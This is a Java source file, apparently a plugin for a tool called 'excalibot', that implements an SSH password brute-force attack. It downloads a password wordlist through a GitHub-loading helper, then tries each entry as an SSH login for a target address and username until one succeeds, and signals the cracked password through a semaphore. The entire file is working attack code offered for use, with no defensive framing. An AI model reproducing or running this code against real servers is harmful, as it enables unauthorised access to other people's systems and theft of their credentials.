package org.powertrip.excalibot.common.plugins.bruteforce; /**
 * Created by Ricardo on 12/01/2016.
 */



import com.jcraft.jsch.JSchException;

import java.io.IOException;
import java.util.concurrent.Semaphore;


class BruteForce extends Thread  {

    private String pass;
    private String address;
    private String username;
    private String correctPass;
    private Semaphore s1;

    public BruteForce(String address, String username, String correctPass, Semaphore s1){
        this.address = address ;
        this.username = username;
        this.correctPass= correctPass;
        this.s1 = s1;
    }

    public void run() {
        try {
            CrunchifyLoadGithubContent crunch = new CrunchifyLoadGithubContent();
            pass = crunch.Crunchify();
            findPass();
        } catch (IOException e) {
            e.printStackTrace();
        } catch (Throwable throwable) {
            throwable.printStackTrace();
        }
    }

    public void findPass() throws IOException {
        int i = 0;

        //StringBuilder sb = new StringBuilder();
        String lines[] = pass.split("\\r?\\n");

        while (i != lines.length - 1 ) {
            try {
                new SSHConn(lines[i],address,username);
                correctPass=lines[i];
                s1.release();
                return;
            } catch (JSchException e) {
                i++;
                continue;
            }

        }

    }
}
